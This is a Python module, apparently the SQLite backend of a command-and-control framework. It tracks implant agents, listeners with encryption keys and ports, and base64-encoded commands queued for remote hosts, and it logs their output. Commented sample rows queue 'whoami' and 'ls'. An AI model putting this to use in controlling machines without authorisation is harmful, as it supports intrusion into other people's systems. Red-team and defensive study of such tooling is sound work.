from os import path
from core.logger import *
from base64 import b64encode
from datetime import datetime
from sqlite3 import Error, connect

class Stash :

    def __init__(self, db_file):
        self.db_file = db_file

    def create_connection(self):
        conn = None
        try:
            conn = connect(self.db_file)
            # conn.row_factory = lambda cursor, row: row[0]
            return conn
        except Error as e:
            error(e)

        return conn

    def sql_stash(self, sql_query , sql_values=None):
        conn = self.create_connection()

        try:
            c = conn.cursor()
            if sql_values != None:
            	c.execute(sql_query , sql_values)
            else:
            	c.execute(sql_query)
        except Error as e:
            error(e)

        conn.commit()
        conn.close()

    def sql_get_stash(self, sql_query , sql_values=None):
        conn = self.create_connection()
        result = []
        try:
            c = conn.cursor()
            if sql_values != None:
                c.execute(sql_query , sql_values)
            else:
                c.execute(sql_query)
            result = c.fetchall()
        except Error as e:
            error(e)

        conn.close()
        return result

    def db_init(self):
        self.sql_stash( """ PRAGMA foreign_keys = ON; """ )

        ## AGENTS
        self.sql_stash(""" CREATE TABLE IF NOT EXISTS agents (
            agent_name TEXT PRIMARY KEY, \
            listener_name TEXT, \
            remote_ip TEXT, \
            hostname TEXT, \
            beacon_type TEXT, \
            enc_key TEXT, \
            alive BOOLEAN); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS commands (
            command_code TEXT PRIMARY KEY, \
            agent_name TEXT, \
            command TEXT, \
            time_stamp DATETIME NOT NULL DEFAULT (strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime')) ); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS commands_history (
            agent_name TEXT, \
            command_code TEXT PRIMARY KEY, \
            command TEXT, \
            output TEXT, \
            time_stamp DATETIME NOT NULL DEFAULT (strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime')) ); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS key_store (
            enc_key TEXT, \
            list_name TEXT PRIMARY KEY, \
            list_type TEXT, \
            http_ip TEXT, \
            http_port INT, \
            alive BOOLEAN ); """)

    def get_task(self, agent):
        # conn = self.create_connection()
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT command_code,command FROM commands WHERE agent_name = ? ORDER BY time_stamp ASC LIMIT 1' , ( agent, ) )
        #     result = c.fetchall()
        # except Error as e:
        #     error(e)
        #     result = []

        # conn.close()

        query = 'SELECT command_code,command FROM commands WHERE agent_name = ? ORDER BY time_stamp ASC LIMIT 1 ;'
        args = ( agent, )
        result = self.sql_get_stash( query, args )
        return result

    def check_code(self, com_code):
        # conn = self.create_connection()
        # result = []
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT EXISTS(SELECT 1 FROM commands WHERE command_code = ?)' , ( com_code, ) )
        #     result.append( c.fetchall()[0][0] )
        #     c.execute( 'SELECT EXISTS(SELECT 1 FROM commands_history WHERE command_code = ?)' , ( com_code, ) )
        #     result.append( c.fetchall()[0][0] )
        # except Error as e:
        #     error(e)

        # conn.close()
        try:
            result = [ self.sql_get_stash( 'SELECT EXISTS(SELECT 1 FROM commands WHERE command_code = ?)' , ( com_code, ) )[0][0] ]
            result.append( self.sql_get_stash( 'SELECT EXISTS(SELECT 1 FROM commands_history WHERE command_code = ?)' , ( com_code, ) )[0][0] )
        except Exception as e:
            error(e)
            result = [0]
            
        return sum(result)

    def get_key(self, listener):
        # conn = self.create_connection()
        # result = ''
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT enc_key FROM key_store WHERE list_name = ?' , ( listener, ) )
        #     result = c.fetchall()
        # except Error as e:
        #     error(e)

        # conn.close()
        query = 'SELECT enc_key FROM key_store WHERE list_name = ? ;'
        args = ( listener, )
        result = self.sql_get_stash( query, args )
        return result

    # def store_key(self, com_code, key):
    #     conn = self.create_connection()

    def del_commands(self, code):
        # conn = self.create_connection()
        # try:
        #     c = conn.cursor()
        #     c.execute( 'DELETE FROM commands WHERE command_code = ?' , ( code, ) )
        #     conn.commit()
        # except Error as e:
        #     error(e)

        # conn.close()

        self.sql_stash( 'DELETE FROM commands WHERE command_code = ?' , ( code, ) )

    def set_agent_job(self, code, agent, cmd):
        conn = self.create_connection()
        b64cmd = b64encode(cmd.encode()).decode()
        # try:
        #     c = conn.cursor()
        #     c.execute( 'INSERT INTO commands(command_code, agent_name, command) VALUES(?, ?, ?)', ( code, agent, b64cmd ) )
        #     c.execute( 'INSERT INTO commands_history(command_code,agent_name,command,output) VALUES(?, ?, ?, ?)', ( code, agent, cmd, "" ))
        #     conn.commit()
        # except Error as e:
        #     error(e)

        # conn.close()
        self.sql_stash( 'INSERT INTO commands(command_code, agent_name, command) VALUES(?, ?, ?)', ( code, agent, b64cmd ) )
        self.sql_stash( 'INSERT INTO commands_history(command_code,agent_name,command,output) VALUES(?, ?, ?, ?)', ( code, agent, cmd, "" ))

    def get_listeners(self, full=False):
        # conn = self.create_connection()
        # result = ''
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT list_name FROM key_store' )
        #     result = c.fetchall()
        # except Error as e:
        #     error(e)

        # conn.close()
        if full:
            query = 'SELECT list_name,list_type,http_ip,http_port FROM key_store WHERE alive = True ;'
        else:
            query = 'SELECT list_name,list_type FROM key_store WHERE alive = True ;'
        result = self.sql_get_stash( query )
        return result

    def get_listener(self, listener):
        query = 'SELECT list_type,http_ip,http_port FROM key_store WHERE list_name = ? ;'
        args = (listener, )
        result = self.sql_get_stash( query, args )
        return result

    def get_agents(self, listener=None):
        # conn = self.create_connection()
        # result = ''
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT agent_name,hostname FROM agents WHERE alive = True' )
        #     result = c.fetchall()
        # except Error as e:
        #     error(e)

        # conn.close()
        if listener:
            query = 'SELECT agent_name,hostname FROM agents WHERE listener_name = ? AND alive = True ;'
            args = (listener,)
            result = self.sql_get_stash( query, args )
        else:
            query = 'SELECT agent_name,hostname FROM agents WHERE alive = True ;'
            result = self.sql_get_stash( query )
        return result

    def get_agents_comm_list(self, agent):
        # conn = self.create_connection()
        # result = ''
        # try:
        #     c = conn.cursor()
        #     c.execute( 'SELECT command,output FROM commands_history WHERE agent_name = ?' , ( agent, ) )
        #     result = c.fetchall()
        # except Error as e:
        #     error(e)

        # conn.close()
        query = 'SELECT command,output FROM commands_history WHERE agent_name = ? ;'
        args = ( agent, )
        result = self.sql_get_stash( query, args )
        return result[::-1]

    def get_agent_from_comm(self, comm):
        query = 'SELECT agent_name FROM commands WHERE command_code = ? ;'
        args = ( comm )
        return self.sql_get_stash( query, args )

    def get_command_codes(self):
        query = 'SELECT command_code FROM commands_history ;'
        return self.sql_get_stash( query )

    def register_list(self, name, l_type, key, ip, port):
        query = 'INSERT INTO key_store(enc_key, list_name, list_type, http_ip, http_port, alive) VALUES( ?, ?, ?, ?, ?, ? )'
        args = (key, name, l_type, ip, port, True)
        self.sql_stash( query, args )

    def check_ip_n_port(self, ip, port):
        if ip == '0.0.0.0':
            query = 'SELECT http_port FROM key_store WHERE alive = True ;'
            port_same_ip = self.sql_get_stash( query )
        else:
            query = 'SELECT http_port FROM key_store WHERE http_ip = ? OR http_ip = "0.0.0.0" AND alive = True ;'
            args = (ip,)
            port_same_ip = self.sql_get_stash( query, args )

        if not port_same_ip:
            return False

        if any([1 if port == p[0] else 0 for p in port_same_ip]):
            return True
        else:
            return False



## command history
## insert into commands_history(command_code,agent_name,command,output) VALUES("oooogy78","adadasddsa","command one yeah lol","");
## commands
## insert into commands(command_code,agent_name,command) VALUES("wwwwgy78","adadasddsa","ls");


###

#insert into commands(command_code,agent_name,command) VALUES("dfvsvdfsdfv","cKrOXnHoyE","EQ240FLMi3z5l2R4GNUJeKPVXGrKz3qwm7++2jAAZMM=");
#insert into commands_history(command_code,agent_name,command,output) VALUES("dfvsvdfsdfv","cKrOXnHoyE","whoami","");